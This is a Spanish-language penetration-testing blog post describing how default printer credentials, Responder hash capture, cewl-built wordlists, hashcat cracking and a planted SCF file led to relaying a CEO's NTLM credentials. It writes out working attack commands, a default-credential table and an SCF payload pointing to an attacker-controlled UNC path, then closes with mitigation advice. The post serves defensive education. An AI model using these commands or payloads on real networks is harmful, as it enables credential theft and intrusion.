---
title: "Cómo una impresora me dio acceso a los archivos del CEO"
date: 2026-04-26
description: "Una toma de red olvidada en una sala de reuniones, una impresora demasiado confiada y una contraseña adivinada con la web de la propia compañía. El resto se cuenta solo."
tags: ["Impresoras", "SMB Relay", "Responder", "Cewl", "Pentesting", "Active Directory", "Hashcat"]
categories: ["Analisis"]
draft: false
---

Llevo meses queriendo escribir sobre esto porque cada vez que hago un pentest en un cliente grande la historia se repite casi palabra por palabra. No importa el sector. No importa el tamaño. Las **impresoras** son siempre el mismo punto ciego.

Lo que viene es un engagement real, con los detalles cambiados para proteger al cliente pero con las técnicas intactas. Un cliente con mucha dispersión geográfica, decenas de sedes y una flota de impresoras que nadie podía gestionar de verdad. No hubo exploits de día cero. No hubo phishing. No hubo malware. Solo un cable enchufado donde no debería, una impresora demasiado confiada y una contraseña adivinada con **cewl** usando la propia web corporativa del cliente.

## El cable en la sala de reuniones

El alcance era amplio. Evaluación física y de red. Sin IP, sin cable, sin credenciales. Tenía que encontrar yo la forma de entrar. Me senté en una sala de reuniones vacía con mi portátil, como si esperase a alguien.

Enchufé el cable que había en la roseta. DHCP me soltó una IP en un rango `10.x`. Ping al gateway. Respuesta. Tiré un ARP scan rápido al `/24` solo por curiosidad:

```
sudo arp-scan --interface=eth0 --localnet
```

Y aquí ya se me encendió una lucecita. Entre las respuestas salieron hostnames que no pegaban nada con una red de invitados: `PRINTER-REC-01`, `NAS-BACKUP-03`, `SRV-RESERVAS`. Es decir, desde una sala de reuniones podía ver directamente dispositivos corporativos. Sin **NAC**, sin separación real. La red accesible desde esa zona compartía segmento con la infraestructura interna. Bingo.

Esto por sí solo ya es un hallazgo de informe. Pero era solo el principio.

## Las impresoras no son periféricos, son servidores

Antes de seguir con el ataque, merece la pena pararse aquí. Porque sin entender esto, lo que viene después no tiene el mismo impacto. Y es algo que creo que mucha gente, entre los que me incluía hace años, subestima.

### La idea en simple

Piensa en el conserje del edificio. Tiene las llaves de todos los despachos, conoce los códigos de las alarmas, y entra antes que nadie por la mañana. Si el conserje se jubila y nadie cambia las cerraduras, las llaves siguen funcionando. Si nadie le pidió las llaves, las sigue teniendo. Y si esas llaves se las da a un sobrino para que le ayude un día, ese sobrino entra a todos los despachos.

La impresora moderna es ese conserje. El que la instaló en esta sede se fue hace años. Las credenciales del panel siguen siendo las que dejó ese día. Y eso es exactamente lo que pasó aquí.

### La idea técnica

Una multifunción moderna no es un periférico, es un servidor Linux empotrado con funciones de fotocopiadora. Tiene sistema operativo completo, pila de red, servicios escuchando en puertos conocidos, almacenamiento interno, y casi siempre clientes **SMB**, **LDAP** y **SMTP** configurados con cuentas de dominio. Puertos típicos:

| Puerto | Protocolo | Para qué |
|---|---|---|
| 80, 443 | HTTP(S) | Panel de administración web |
| 9100 | JetDirect / RAW | Impresión directa |
| 631 | IPP | Internet Printing Protocol |
| 515 | LPD | Line Printer Daemon |
| 161 | SNMP | Gestión y descubrimiento |
| 445 | SMB | Cliente SMB para escaneo a carpeta |

Un `nmap` sobre el segmento visible me dio un inventario útil:

```
nmap -sS -p 80,443,631,9100,515,161,445 -oA printers 10.10.0.0/16
```

Los paneles web salieron a decenas, con banners que delataban al fabricante. Sobre todo HP y Ricoh, dos flotas claras que convivían probablemente porque en algún momento se cambió de proveedor y nunca se retiró la anterior.

## Paso uno: el panel web

Escogí una HP al azar. Fui al panel web. Login. Probé `admin` / `admin`. Dentro a la primera.

Repetí en otras. Varias HP con admin sin contraseña o con `admin / admin`. Las Ricoh tenían su propio clásico: admin con contraseña vacía en la mayoría de modelos de la gama MP. No era una excepción, era el patrón. La flota es tan grande y tan distribuida que rotar las credenciales en cada dispositivo es un trabajo que nadie tiene presupuesto para hacer, y menos para mantener en el tiempo. Así que no se hace.

Tabla orientativa de credenciales por defecto, por si te encuentras con flota mixta:

| Fabricante | Usuario | Contraseña |
|---|---|---|
| HP | admin | (vacío) o admin |
| Xerox | admin | 1111 |
| Lexmark | (vacío) o admin | admin |
| Konica Minolta | admin | 12345678 |
| Ricoh | admin | (vacío) |
| Brother | admin | access |

Dentro del panel de la HP vi lo que buscaba: la sección de escaneo a carpeta de red. La impresora tenía configurada una ruta SMB hacia un file server interno, y un usuario de dominio para autenticarse contra ese share. Algo tipo `DOMAIN\svc_print`. Contraseña, asteriscos.

Y aquí viene una cosa que me gusta remarcar porque se infravalora muchísimo. **El panel de una impresora es una fuente de inteligencia brutal sobre el dominio**. Antes incluso de empezar a atacar nada, solo navegando por las pestañas de configuración con las credenciales de admin, tenía delante la dirección del controlador de dominio usado para LDAP, el nombre del dominio de Active Directory, el servidor SMTP corporativo con usuario de envío, al menos un file server configurado como destino de escaneo, un usuario de dominio con nombre de cuenta visible, y libreta de direcciones con correos internos útiles para mapear estructura de departamentos.

Todo eso sin tocar un paquete. Solo leyendo la configuración. El panel, que se supone que está para gestionar la impresora, está actuando como un directorio corporativo para cualquiera que entre.

Pues vamos a sacar esa contraseña.

## Haciendo que la impresora me hable a mí

El truco es de manual y funciona desde hace años. Si la impresora está configurada para escribir en un servidor SMB, yo puedo cambiar la dirección de ese servidor en el panel. Le pongo mi IP. Le digo que haga un escaneo de prueba o directamente que pruebe la conexión. La impresora se autentica contra lo que cree que es el file server, y yo me quedo con el **NetNTLMv2** de la cuenta que tenía guardada.

La analogía fácil. Es como si al cartero de la empresa, que lleva años entregando los paquetes en el mismo almacén, le cambiaras la dirección del almacén en su libreta. Él va, llama a la puerta nueva, y te entrega todo lo que llevaba en la mochila sin preguntar. No es culpa suya. Hace lo que le han dicho que hace.

Levanté **Responder** en mi interfaz:

```
sudo responder -I eth0 -wv
```

Edité la configuración de destino SMB en el panel de la HP apuntando a mi IP. Pulsé el botón de test. Responder cantó el hash casi al instante:

```
[SMB] NTLMv2-SSP Client   : 10.10.5.42
[SMB] NTLMv2-SSP Username : CORPORATE\svc_print
[SMB] NTLMv2-SSP Hash     : svc_print::CORPORATE:1122334455667788:...
```

NetNTLMv2 en la mano. A partir de aquí, dos caminos.

| Camino | Ventaja | Inconveniente |
|---|---|---|
| Relay a otro SMB | Inmediato, sin crackear | Requiere SMB signing deshabilitado y ventana activa |
| Crackeo offline | Silencioso, no deja huella en destinos | Depende de la fortaleza de la contraseña |

Me fui por el crackeo offline. Spoiler: era la opción correcta.

## Sacando la contraseña con cewl

### La idea en simple

Cuando alguien configura una impresora y tiene que elegir una contraseña, casi nunca saca un generador aleatorio. Elige algo que pueda recordar después: el nombre de la empresa, una marca vieja, una fecha de fundación, el nombre del departamento. Cosas que están, literalmente, en la web corporativa.

Así que no tienes que adivinar a ciegas con un diccionario genérico. Puedes **construir un diccionario personalizado a partir de la propia web del cliente**. Las palabras que tenía en la cabeza el técnico cuando eligió la contraseña probablemente son las mismas que aparecen en la web.

### Cómo funciona

**Cewl** es una herramienta que se pasea por una web, sigue enlaces hasta la profundidad que le digas, y extrae todas las palabras únicas con una longitud mínima. Perfecta para este caso:

```
cewl -d 2 -m 5 -w wordlist-base.txt https://www.corporate.com
```

En unos minutos tenía un par de miles de palabras extraídas literalmente de la web del cliente. Nombre actual de la empresa, una marca antigua que todavía aparecía en notas de prensa viejas, nombres de productos, ciudades de sedes, años clave. Todo el vocabulario que probablemente flotaba por la cabeza de quien configuró la impresora.

Con eso, **hashcat** y una regla de mutaciones típicas, que es lo que convierte `empresa` en `Empresa2024`, `empresa!`, `empresa123`, `Empresa.2020` y similares:

```
hashcat -m 5600 hash.txt wordlist-base.txt -r /usr/share/hashcat/rules/best64.rule
```

Contraseña crackeada en segundos. Era el nombre de una marca antigua de la compañía con un año pegado al final. Ni siquiera una variante creativa.

### Resumen del proceso

| Paso | Herramienta | Resultado |
|---|---|---|
| Capturar hash de la impresora | Responder + panel SMB | NetNTLMv2 de `svc_print` |
| Generar diccionario corporativo | `cewl` sobre la web | Wordlist con el vocabulario del cliente |
| Mutar y probar | `hashcat` con `best64.rule` | Contraseña en segundos |

Lo que más me impacta de esto es que funciona casi siempre.

## La cuenta de servicio mal dimensionada

Con la contraseña de `svc_print` en la mano, lo lógico es ver qué puede tocar esa cuenta. Y aquí me llevé la sorpresa que te llevas en casi todos los pentests. La cuenta de la impresora tenía permisos de escritura sobre el share `\\fileserver\users$`, donde estaban las **home directories** de todo el dominio.

La lógica del que lo configuró se entiende. La impresora tiene que poder escribir el PDF escaneado en la carpeta del usuario que ha lanzado el escaneo. Así que le dieron permisos sobre todas esas carpetas. Lo que no pensaron es que escritura significa escritura arbitraria. Puedo dejar lo que quiera en la carpeta de cualquier usuario. Incluyendo la del CEO.

Este no es un fallo de la impresora. Es un fallo de diseño en el AD. La impresora solo fue el vehículo para llegar a unas credenciales mal dimensionadas desde el primer día. Y esto es lo que me irrita del problema. Las impresoras son la punta del iceberg, pero debajo hay decisiones de permisos que llevan años ahí y que nadie revisa porque todo "funciona".

## Del hash al despacho del CEO

En la carpeta personal del CEO dejé un archivo llamado `documents.scf`. Un **SCF** es un archivo de atajo de Windows que, cuando el Explorador procesa la carpeta para renderizar iconos, intenta cargar el icono desde la ruta que le indiques. Si la ruta es un UNC que apunta a tu equipo, el Explorador del usuario intenta autenticarse contra ti antes de pedirte el icono. Y en ese intento envía su hash NTLMv2.

Contenido del fichero:

```
[Shell]
Command=2
IconFile=\\10.10.99.50\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

Lo subí a la home del CEO usando la propia cuenta `svc_print`:

```
smbclient //fileserver/users$ -U svc_print%PASSWORD -c 'cd ceo.user; put documents.scf'
```

En mi máquina tenía Responder corriendo para recoger la autenticación entrante. El CEO abrió su carpeta de documentos a la mañana siguiente, el Explorador procesó el SCF, y Responder sacó un NTLMv2 a su nombre.

A partir de ahí tenía dos opciones. Una, crackear el hash offline con hashcat asumiendo que su contraseña no fuera una barbaridad. La otra, la buena, hacer relay con `ntlmrelayx` a un servidor donde él tuviera sesión o a su propio portátil. Su cuenta tenía local admin en el equipo corporativo, por razones que escapan a mi entendimiento, así que el relay a su máquina fue trivial.

Una vez con sesión en el portátil del CEO, acceso a su perfil entero, sus documentos locales, sus correos cacheados en Outlook, y el resto te lo imaginas.

## Lo que se debería hacer

La parte de mitigación es la que más me cuesta resumir porque cada bullet de aquí es una guerra interna en una empresa grande. Pero por orden de impacto.

**Segmentación real.** Las impresoras viven en su propia VLAN. Sin acceso lateral al segmento de servidores. Sin salida a internet salvo lo estrictamente necesario. Una sala de reuniones no debería compartir broadcast domain con un file server. Cuesta ponerlo a punto. La alternativa es lo que acabas de leer.

**Contraseñas no adivinables.** Si tu contraseña contiene cualquier palabra que aparezca en tu propia web corporativa, puedes darla por rota antes incluso de que te la roben. Generadas aleatoriamente, almacenadas en un gestor, rotadas periódicamente. Y desde luego, no la misma para toda la flota.

**Credenciales por defecto fuera de los paneles el primer día.** Y mientras estás ahí, deshabilita la visualización en claro de la contraseña SMTP en los paneles que lo permiten. Sí, muchos fabricantes todavía muestran la contraseña en claro si le das a un botón.

**Cuentas de servicio con permisos mínimos.** Si una impresora tiene que escribir el PDF en la carpeta personal del usuario, hazlo de forma que solo pueda escribir en la carpeta de quien ha lanzado el escaneo. No en todas. Esto implica repensar el modelo de permisos, y sí, da trabajo. La alternativa es lo que acabas de leer.

**SMB signing obligatorio** en toda la infraestructura de ficheros. No mata el vector por sí solo, pero cierra la puerta al relay directo si algún día las cosas se ponen peor.

**Inventario y auditoría de file servers legacy.** Si has migrado al cloud, migra de verdad. Identifica qué queda onprem, quién tiene acceso, qué datos contiene y si sigue siendo necesario que exista. Todo lo que no esté claro, se aísla o se archiva en frío. Un file server que nadie mira es un file server que alguien más va a encontrar.

> Las impresoras no son periféricos. Son servidores con patas, con credenciales de dominio y con acceso a datos sensibles. Y cuando además comparten cuenta entre toda la flota, la contraseña es adivinable desde tu propia web, y la cuenta tiene acceso a los rincones legacy de tu infraestructura que llevan una década sin tocarse, lo que tienes no es un problema de impresoras. Tienes una arqueología de decisiones pequeñas que nadie revisó. Y alguien con un cable la acaba de excavar entera.
